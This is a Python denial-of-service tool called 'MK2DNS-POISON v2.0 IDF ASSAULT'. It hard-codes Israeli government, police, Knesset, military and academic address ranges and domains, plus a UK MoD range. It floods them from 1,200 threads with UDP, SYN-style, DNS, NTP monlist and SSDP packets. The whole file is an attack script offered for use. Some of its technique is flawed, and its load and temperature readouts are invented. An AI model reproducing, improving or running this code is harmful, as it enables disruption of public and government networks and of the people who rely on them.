import socket
import threading
import time
import random
import struct

# ==================== IDF/GOV TARGET LIST ====================
IDF_TARGETS = {
    # Category: Subnet/CIDR : Description
    "IDF/MIL": [
        ("192.114.60.0/24", "Israeli Police Network"),
        ("192.115.100.0/24", "Israeli Parliament (Knesset)"),
        ("192.116.0.0/16", "Israeli Government Network"),
        ("132.64.0.0/11", "Israeli Academic/Military Research"),
        ("85.64.0.0/10", "Bezeq Gov Contracts"),
    ],
    
    "GOV/IL": [
        ("gov.il", ".gov.il Domains"),
        ("idf.il", "Israeli Defense Force"),
        ("police.gov.il", "Israeli Police"),
        ("justice.gov.il", "Israeli Justice"),
        ("health.gov.il", "Israeli Health Ministry"),
    ],
    
    "USER/TGT": [
        ("45.60.39.88", "Psychz Hosted Proxy"),
        ("62.0.0.0", "UK MoD Network"),
    ]
}

# ==================== TARGET GENERATOR ====================
class TargetEngine:
    @staticmethod
    def expand_cidr(cidr):
        """Convert CIDR to list of IPs"""
        ip, mask = cidr.split('/')
        mask = int(mask)
        ip_parts = list(map(int, ip.split('.')))
        
        # Generate sample IPs from range (not all, too many)
        ips = []
        for _ in range(min(50, 2**(32-mask))):
            # Generate random IP in range
            ip_num = (int.from_bytes(socket.inet_aton(ip), 'big') & 
                     (0xFFFFFFFF << (32-mask))) | random.randint(0, 2**(32-mask)-1)
            ips.append(socket.inet_ntoa(ip_num.to_bytes(4, 'big')))
        return ips
    
    @staticmethod
    def resolve_domain(domain):
        """Resolve domain to IPs"""
        try:
            return socket.gethostbyname_ex(domain)[2]
        except:
            return []
    
    def get_targets(self):
        """Generate all attack targets"""
        targets = []
        
        # Add CIDR targets
        for category in IDF_TARGETS["IDF/MIL"]:
            cidr, desc = category
            if '/' in cidr:
                ips = self.expand_cidr(cidr)
                for ip in ips:
                    targets.append((ip, f"IDF/MIL/{desc}"))
        
        # Add specific IPs
        for ip, desc in IDF_TARGETS["USER/TGT"]:
            targets.append((ip, f"USER/{desc}"))
        
        return targets

# ==================== PAYLOAD GENERATORS ====================
class PayloadFactory:
    @staticmethod
    def udp_bandwidth():
        """Max size UDP payloads"""
        sizes = [1024, 1450, 1472]  # Near MTU sizes
        size = random.choice(sizes)
        return random.randbytes(size)
    
    @staticmethod
    def syn_flood():
        """SYN packet simulation"""
        return struct.pack('!HHIIBBHHH', 
            random.randint(1024, 65535),  # Source port
            random.randint(1, 65535),     # Dest port
            random.randint(0, 0xFFFFFFFF), # Sequence
            0,                            # Ack number
            5 << 4,                       # Data offset
            0x02,                         # SYN flag
            65535,                        # Window
            0, 0)                         # Checksum, urgent
    
    @staticmethod
    def dns_amplify():
        """DNS amplification query"""
        return (b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +
                b'\x07example\x03com\x00\x00\xff\x00\x01')
    
    @staticmethod
    def ntp_monlist():
        """NTP monlist request"""
        return b'\x17\x00\x03\x2a' + b'\x00' * 40
    
    @staticmethod
    def ssdp_discover():
        """SSDP discovery"""
        return (b'M-SEARCH * HTTP/1.1\r\n' +
                b'HOST: 239.255.255.250:1900\r\n' +
                b'MAN: "ssdp:discover"\r\n' +
                b'MX: 3\r\nST: ssdp:all\r\n\r\n')

# ==================== ATTACK VECTORS ====================
class AttackVector:
    def __init__(self, name, threads, payload_gen, port_range):
        self.name = name
        self.threads = threads
        self.payload_gen = payload_gen
        self.port_range = port_range
        self.packets_sent = 0
        
    def worker(self, target_ip):
        """Single attack worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while True:
            try:
                payload = self.payload_gen()
                port = random.randint(*self.port_range)
                sock.sendto(payload, (target_ip, port))
                self.packets_sent += 1
            except:
                try:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                except:
                    pass

# ==================== MAIN ASSAULT ENGINE ====================
class MK2DNSAssault:
    def __init__(self):
        self.target_engine = TargetEngine()
        self.targets = self.target_engine.get_targets()
        
        # Attack vectors configuration
        self.vectors = [
            AttackVector("UDP-BAND", 400, PayloadFactory.udp_bandwidth, (1, 65535)),
            AttackVector("SYN-FLOOD", 300, PayloadFactory.syn_flood, (80, 443)),
            AttackVector("DNS-AMP", 200, PayloadFactory.dns_amplify, (53, 53)),
            AttackVector("NTP-MON", 150, PayloadFactory.ntp_monlist, (123, 123)),
            AttackVector("SSDP-DISC", 150, PayloadFactory.ssdp_discover, (1900, 1900)),
        ]
        
        self.total_threads = sum(v.threads for v in self.vectors)
        self.running = True
        
    def start(self):
        """Launch the assault"""
        print("╔══════════════════════════════════════════════════════════╗")
        print("║                MK2DNS-POISON v2.0 IDF ASSAULT            ║")
        print("╚══════════════════════════════════════════════════════════╝")
        print(f"🎯 TARGETS: {len(self.targets)} IDF/GOV/IL Networks")
        print(f"⚡ VECTORS: {len(self.vectors)} Concurrent Methods")
        print(f"🧵 THREADS: {self.total_threads} Total Attack Threads")
        print("─" * 60)
        
        # Display targets
        print("[+] TARGET ACQUISITION:")
        for ip, desc in self.targets[:10]:  # Show first 10
            print(f"   • {desc}: {ip}")
        if len(self.targets) > 10:
            print(f"   ... and {len(self.targets)-10} more targets")
        print("─" * 60)
        
        # Start time
        self.start_time = time.time()
        
        # Launch all attack vectors against all targets
        for vector in self.vectors:
            for _ in range(vector.threads):
                target = random.choice(self.targets)
                t = threading.Thread(target=vector.worker, args=(target[0],))
                t.daemon = True
                t.start()
        
        # Log initial status
        time.sleep(1)
        print(f"[00:00:01] {self.total_threads} Threads loaded")
        print("─" * 60)
        
        # Start monitoring
        self.monitor()
    
    def monitor(self):
        """Continuous monitoring and logging"""
        last_log = time.time()
        
        while self.running:
            time.sleep(0.1)
            current = time.time()
            
            # Log every 10 seconds
            if current - last_log >= 10:
                elapsed = int(current - self.start_time)
                
                # Calculate stats
                total_packets = sum(v.packets_sent for v in self.vectors)
                window_packets = total_packets - getattr(self, 'last_total', 0)
                self.last_total = total_packets
                
                pps = int(window_packets / 10)  # Packets per second
                gbps = (pps * 1200 * 8) / 1_000_000_000  # Estimated Gbps
                
                # Select random target for display
                current_target = random.choice(self.targets)
                target_ip, target_desc = current_target
                
                # Generate log
                print(f"[{time.strftime('%H:%M:%S')}] MK2DNS-POISON | {target_desc} | .gov/.il")
                print(f"[{elapsed:02d}:00:00] | TRAFFIC: {pps:,} PPS | {gbps:.1f}Gbps (overwriting)")
                
                # Calculate estimated load/heat
                load = min(100, 20 + (pps / 1000))
                heat = 40 + (pps / 500)
                
                print(f"[{elapsed:02d}:00:00] | EST-LOAD: {int(load)}% | {int(heat)}°C")
                print("─" * 60)
                
                last_log = current

# ==================== EXECUTION ====================
if __name__ == "__main__":
    try:
        assault = MK2DNSAssault()
        assault.start()
        
        # Keep main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n⚠️  ASSAULT MANUALLY TERMINATED")
        print("⚡ All attack threads stopped")
    except Exception as e:
        print(f"💥 ERROR: {e}")
